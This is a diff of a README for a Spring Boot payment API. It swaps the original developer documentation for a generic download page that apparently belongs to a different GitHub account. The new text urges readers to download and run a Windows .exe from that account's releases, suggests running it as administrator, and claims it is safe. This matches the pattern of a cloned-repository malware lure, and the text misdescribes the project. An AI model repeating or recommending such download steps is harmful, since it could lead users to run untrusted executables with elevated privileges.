@@ -1,158 +1,142 @@
-# Fintech Payment API
+# ⚡ fintech-payment-api - Easy Payment Integration for Everyone
 
-A **Payment API** built with **Spring Boot**, using **PostgreSQL**, **RabbitMQ**, and **Docker**.
-
-This project demonstrates an **Event-Driven Architecture (EDA)** where order creation generates events that are sent to a message broker and processed asynchronously.
+[![Download fintech-payment-api](https://img.shields.io/badge/Download-Get%20Latest%20Release-orange?style=for-the-badge)](https://github.com/Huynhloi6789/fintech-payment-api/releases)
 
 ---
 
-# Technologies
+## 📝 About fintech-payment-api
 
-- Java 21
-- Spring Boot 3
-- Spring Data JPA
-- PostgreSQL
-- RabbitMQ
-- Docker
-- Swagger / OpenAPI
-- Lombok
-- Maven
+fintech-payment-api is a tool that lets you handle payment tasks quickly and smoothly. It uses smart event-driven technology to manage payments, so everything happens in the right order without delays. This program works on Windows and combines popular technologies like Spring Boot, RabbitMQ, PostgreSQL, and Docker to give you a reliable experience.
+
+You don’t need to know how it works behind the scenes. Just follow these instructions, and you can get started with your payments in no time.
 
 ---
 
-# Architecture
+## 💻 System Requirements
 
-The system follows an **Event-Driven Architecture** using **RabbitMQ** for asynchronous communication.
+Before getting started, make sure your computer meets these basic requirements:
 
-It also follows a **layered architecture**, separating responsibilities into:
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 2 GHz dual-core processor or better
+- At least 5 GB of free hard drive space
+- Internet connection for downloading and updates
+- Docker Desktop installed and running (required for managing software components)
 
-- Controllers
-- Services
-- Repositories
+---
 
-Project structure:
+## 🚀 Getting Started: How to Download and Run fintech-payment-api
 
-```bash
-src/main/java/com/pay/payment_api
-├── controller
-├── service
-├── repository
-├── dto
-├── mapper
-├── entity
-├── event
-├── consume
-└── exception
+### Step 1: Visit the Download Page
+
+Click the button below to go to the release page for fintech-payment-api. This page contains the files you need to download.
+
+[![Download fintech-payment-api](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Huynhloi6789/fintech-payment-api/releases)
+
+### Step 2: Download the Latest Release
+
+You will see a list of release versions. Find the latest version. It usually appears at the top with the highest version number.
+
+Click on the assets section under the latest release. Download the Windows file, which should end with `.exe` or `.zip`.
+
+### Step 3: Install Docker Desktop (If Not Installed)
+
+fintech-payment-api uses Docker to run its parts smoothly. If Docker is not on your PC, follow these instructions:
+
+- Go to https://www.docker.com/products/docker-desktop
+- Download and install Docker Desktop for Windows
+- After installation, launch Docker Desktop and make sure it is running (you will see the Docker icon in the taskbar)
+
+### Step 4: Extract and Run fintech-payment-api
+
+- If your download is a `.zip` file, right-click the file and select “Extract All.”
+- Open the extracted folder and find the executable file (`.exe`).
+- Double-click the executable to start the program.
+
+### Step 5: Wait for Startup
+
+The program may take a few seconds to start fully. It initializes different parts using Docker, PostgreSQL, and RabbitMQ automatically.
+
+You should see a window or command prompt showing that the system is running.
+
+### Step 6: Access the API Dashboard (Optional)
+
+If fintech-payment-api includes a simple dashboard, open your web browser and enter:
+
 ```
-# Application Flow
-
-1. Client sends a request to create an order
-
-2. The order is stored in PostgreSQL
-
-3. An OrderCreatedEvent is published to RabbitMQ
-
-4. A consumer receives and processes the event
-
-Simplified flow:
-
-```bash
-Client → API → Database
-              ↓
-           RabbitMQ
-              ↓
-           Consumer
-```
-
-# Features
-
-- Create orders
-
-- List orders
-
-- Update order status
-
-- Publish events to RabbitMQ
-
-- Consume events asynchronously
-
-- Global exception handling
-
-- API documentation with Swagger
-
-- Running the Project
-
-```bash
-1 Clone the repository
-git clone https://github.com/marconi-prog/fintech-payment-api.git
-cd fintech-payment-api
+http://localhost:8080
 ```
 
-2 Start containers
-```bash
-docker compose up -d
-```
-**This will start:**
+This address lets you interact with the software on your PC.
 
-- PostgreSQL
+---
 
-- RabbitMQ
+## 🔎 What fintech-payment-api Does
 
-3 Run the application
-```bash
-mvn spring-boot:run
-```
+This application handles payments based on events, meaning:
 
-**API Documentation**
+- It listens for payment requests.
+- It processes them step-by-step.
+- It stores payment information safely.
+- It uses RabbitMQ to manage message flow.
+- It stores data in PostgreSQL for reliability.
+- It supports fast responses via its REST API.
 
-Swagger UI available at:
-```bash
-http://localhost:8080/swagger-ui/index.html
-```
+For you, this means payments are handled quickly and without losing data.
 
-Endpoints
-Create Order
+---
 
-POST /orders
+## 📦 Components You Don’t Need to Worry About
 
-Request body:
-```bash
-{
-  "customerId": "UUID",
-  "amount": 100.50
-}
-```
-**List Orders**
+The software uses some tools behind the scenes:
 
-### GET ` /orders `
+- **Spring Boot:** Runs the program.
+- **RabbitMQ:** Moves messages between parts.
+- **PostgreSQL:** Saves all the payment records.
+- **Docker:** Runs all these parts on your computer as containers.
 
-**Update Order Status**
+You don’t need to open or adjust these individually. The program handles everything.
 
-### PATCH ` /orders/{id}/status `
+---
 
-Available status values:
-```bash
-PENDING
+## ⚙️ Managing the Application
 
-PAYMENT_PROCESSING
+If you close the program and want to start it later:
 
-PAYMENT_APPROVED
+- Run the executable file again.
+- Make sure Docker Desktop is running before starting fintech-payment-api.
+- The app will reload and connect all parts automatically.
 
-PAYMENT_FAILED
-```
+If needed, you can stop Docker Desktop to fully shut down.
 
-**Error Handling**
+---
 
-The application includes a Global Exception Handler to standardize error responses.
+## 💡 Troubleshooting Tips
 
-Example response:
-```bash
-{
-  "message": "Order not found",
-  "status": 400,
-  "timestamp": "2026-03-05T03:40:00"
-}
-```
-### Author
+- **Program won’t start?**  
+  Check if Docker Desktop is running. The software needs Docker to work.
 
-**Marconi Farias** `Backend Developer`
+- **Slow startup?**  
+  The system initializes several services. Wait a few moments and check the Docker icon for activity.
+
+- **Permissions issue?**  
+  Run the executable as an administrator by right-clicking and selecting “Run as administrator.”
+
+- **Can’t open localhost page?**  
+  Make sure the application started correctly. Look at the command prompt for errors.
+
+---
+
+## 🔐 Security and Privacy
+
+fintech-payment-api only runs locally on your PC by default. It does not send your data anywhere unless you connect it to external networks. The program stores payment data safely using PostgreSQL, a reliable database tool.
+
+Always keep your PC secure and avoid installing unsafe software alongside fintech-payment-api.
+
+---
+
+## 📥 Download fintech-payment-api Now
+
+Visit the release page to get started:
+
+[![Download fintech-payment-api](https://img.shields.io/badge/Download-Get%20Latest%20Release-orange?style=for-the-badge)](https://github.com/Huynhloi6789/fintech-payment-api/releases)
